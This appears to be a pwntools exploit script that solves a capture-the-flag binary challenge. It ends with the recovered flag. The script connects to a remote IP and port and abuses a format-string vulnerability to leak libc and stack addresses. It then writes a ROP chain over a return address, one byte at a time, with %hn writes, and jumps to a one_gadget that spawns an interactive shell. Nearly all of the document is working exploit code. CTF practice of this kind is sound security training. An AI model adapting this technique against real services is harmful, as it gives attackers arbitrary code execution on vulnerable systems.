#!/usr/bin/env python3
from pwn import *
# helper
def str2hex(str):
    return int('0x' + str.encode()[::-1].hex(), 16)

context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu'.split()
context.arch = 'amd64'
conn = 'nc 34.70.212.151 8002'.split()
host, port = conn[1], int(conn[2])
e = ELF('./chall')
lib = ELF('./libc.so.6', checksec=False)

script = """
brva 0x00000000000155C
# brva 0x0000000000012C2
c
"""

if args.REMOTE:
    p = remote(host, port)
elif args.GDB:
    p = gdb.debug(e.path, gdbscript=script, aslr=False)
else:
    p = process(e.path)
    
def write(addr, val):
    for i in range(6):
        word = val>>8*i & 0xff 
        if word == 0:
            payload = f'%8$hn'.encode()
        else:
            payload = f'%{word}c%8$hn'.encode()
        payload = payload.ljust(16, b'b') + p64(addr+i)
        print(payload)
        print(len(payload))
        p.sendlineafter(b'>> ', b'2')
        p.sendlineafter(b'>> ', payload)


p.sendlineafter(b'>> ', b'1')
p.recvuntil(b': ')
lib.address = int(p.recvline(), 16) - lib.sym.fgets
info("lib.address " + hex(lib.address))

p.sendlineafter(b'>> ', b'2')
stack_ptr = 0x1ff8c0+lib.address
p.sendlineafter(b'>> ', f'%7$sbbbb'.encode() + p64(stack_ptr))
stack = u64(p.recv(6) + b'\x00'*2)
info("stack: " + hex(stack))

# counter = stack + (0x7fffffffde84-0x7fffffffdfa8)
# p.sendlineafter(b'>> ', b'2')
# payload = f'%128c%8$hhnbbbbb'.encode() + p64(counter+3)
# p.sendlineafter(b'>> ', payload)

rcx = 0x0012ac4e+lib.address
rbx = 0x001a42c0+lib.address
ret = 0x001a442c+lib.address
one_gadget = 0x54ed3+lib.address
rop = [rcx, 0, rbx, 0, one_gadget]

ret_addr = stack + (0x7fffffffde98-0x7fffffffdfa8)
print(hex(ret_addr))
for i in range(len(rop)):
    write(ret_addr+i*8, rop[i])
p.sendlineafter(b'>> ', b'4')


p.interactive()

# flag{Wr17in6_p1t_w17h_f0rm47_5tr1ng_1s_fun}